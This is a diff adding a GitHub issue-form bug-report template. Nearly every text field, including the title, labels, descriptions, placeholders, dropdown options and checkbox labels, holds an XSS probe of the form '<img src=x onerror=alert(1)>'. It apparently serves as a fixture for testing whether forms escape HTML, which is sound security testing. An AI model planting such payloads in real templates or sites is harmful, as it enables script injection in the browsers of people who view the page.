@@ -1,0 +1,64 @@
+name: Bug Report
+description: File a bug report
+title: "[XSS_PAYLOAD<img src=x onerror=alert(1)>]: "
+labels: ["bug", "triage"]
+projects: ["octo-org/1", "octo-org/44"]
+assignees:
+  - octocat
+body:
+  - type: markdown
+    attributes:
+      value: |
+        XSS_PAYLOAD<img src=x onerror=alert(1)>
+  - type: input
+    id: contact
+    attributes:
+      label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      description: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      placeholder:XSS_PAYLOAD<img src=x onerror=alert(1)>
+    validations:
+      required: false
+  - type: textarea
+    id: what-happened
+    attributes:
+      label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      description: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      placeholder: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      value: XSS_PAYLOAD<img src=x onerror=alert(1)>
+    validations:
+      required: true
+  - type: dropdown
+    id: version
+    attributes:
+      label: Version
+      description: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      options:
+        - XSS_PAYLOAD<img src=x onerror=alert(1)>
+        - XSS_PAYLOAD<img src=x onerror=alert(1)>
+      default: 0
+    validations:
+      required: true
+  - type: dropdown
+    id: browsers
+    attributes:
+      label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      multiple: true
+      options:
+        - Firefox
+        - XSS_PAYLOAD<img src=x onerror=alert(1)>
+        - Safari
+        - Microsoft Edge
+  - type: textarea
+    id: logs
+    attributes:
+      label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      description: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      render: XSS_PAYLOAD<img src=x onerror=alert(1)>
+  - type: checkboxes
+    id: terms
+    attributes:
+      label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      description: XSS_PAYLOAD<img src=x onerror=alert(1)>
+      options:
+        - label: XSS_PAYLOAD<img src=x onerror=alert(1)>
+          required: true
